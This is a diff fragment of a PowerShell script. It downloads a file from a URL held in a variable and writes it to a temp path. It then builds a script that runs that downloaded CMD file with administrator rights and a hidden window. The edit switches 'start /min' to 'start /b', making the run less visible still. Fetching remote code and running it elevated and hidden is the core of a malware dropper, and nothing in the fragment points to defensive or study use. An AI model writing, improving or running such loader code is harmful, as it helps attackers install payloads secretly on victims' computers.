@@ -12,7 +12,7 @@ Invoke-WebRequest -Uri $cmdUrl -OutFile $tempPath
 
 # Create a PowerShell script to run the CMD file as administrator in invisible mode
 $scriptContent = @"
-Start-Process -FilePath 'cmd.exe' -ArgumentList '/c `"start /min $tempPath`"' -Verb RunAs -WindowStyle Hidden
+Start-Process -FilePath 'cmd.exe' -ArgumentList '/c `"start /b $tempPath`"' -Verb RunAs -WindowStyle Hidden
 "@
 
 # Define the path for the temporary PowerShell script
